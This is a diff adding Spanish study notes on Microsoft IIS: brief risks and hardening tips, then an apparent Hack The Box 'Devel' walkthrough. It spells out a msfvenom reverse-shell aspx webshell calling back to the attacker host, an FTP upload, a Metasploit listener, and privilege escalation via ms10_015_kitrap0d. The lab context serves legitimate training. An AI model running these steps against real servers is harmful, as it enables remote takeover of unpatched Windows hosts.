@@ -1,0 +1,100 @@
+📖 Es un servidor web que sirve para alojar y servir sitios web y aplicaciones web, así como manejar protocolos relacionados con la web como HTTP, HTTPS, FTP y SMTP. IIS es un punto crítico de exposición en sistemas Windows. Si no se configura correctamente, puede ser vulnerable a:
+
+
+   > Inyección de código (ej. aspx, SQL o scripts maliciosos)
+   > Ataques de fuerza bruta en autenticación
+   > Explotación de vulnerabilidades del servidor web
+
+
+🛠️ Para que no ocurra lo anterior, es recomendable:
+
+
+   > Mantener IIS actualizado
+   > Configurar correctamente permisos y autenticación
+   > Monitorear logs y tráfico sospechoso
+
+
+🧪 Pasos a seguir para explotar servidores IIS según laboratorios en HTB:
+
+
+   ➡️ Devel (IIS 7)
+
+	1️⃣ Crear un fichero .aspx webshell (con la herramienta "msfvenom"). 
+
+		msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP local Kali> LPORT=4444 -f aspx > shell.aspx
+
+	2️⃣ Conectarse por FTP y subir el fichero que se ha creado. 
+
+		ftp -a <IP máquina víctima> 
+
+		put shell.aspx
+
+	3️⃣ Ejecutar Metasploit
+
+		msfconsole -q
+
+	4️⃣ Buscar el siguiente exploit para inicializar un listener: 
+
+		use exploit/multi/handler
+
+	5️⃣ Usar el comando "show options" y modificar los siguentes parámetros: 
+
+		set lhost <IP local Kali>
+
+		set LPORT 4444
+
+		set payload windows/meterpreter/reverse_tcp
+
+		run
+
+	6️⃣ Introducir la siguiente ruta en el navegador: 
+
+		http://<IP o dominio máquina víctima>/shell.aspx
+	
+	7️⃣ Introducir el siguiente comando para estabilizar la shell: 
+
+		shell
+
+	8️⃣ Ver información del sistema para poder escalar privilegios: 
+
+		systeminfo
+	
+	9️⃣ Buscar "microsoft windows 7 build 7601 (x64) local privilege escalation" (OS version del sistema).
+	
+		Se usará el exploit ms10_015_kitrap0d en metasploit.
+
+	1️⃣0️⃣ Salir de la shell: 
+
+		exit
+
+	1️⃣1️⃣ Establecernos en la ruta C:\Temp:
+
+		cd %TEMP%
+
+	1️⃣2️⃣ Poner la sesión en segundo plano:
+
+		background o bg
+
+	1️⃣3️⃣ Ver la sesión que está Windows:
+
+		sessions
+
+	1️⃣4️⃣ Buscar el nuevo exploit:
+
+		serach ms10_015_kitrap0d
+
+	1️⃣5️⃣ Estabecer los parámetros necesarios:
+
+		set SESSION 1
+		set LHOST <IP local Kali>
+		run
+
+	1️⃣6️⃣ Volver a estabilizar la shell: 
+
+		shell
+
+	Con esto ya seremos usuarios Administradores y podremos acceder a cualquier ruta y obtener las flags.
+	
+
+   ➡️ Otra máquina
+
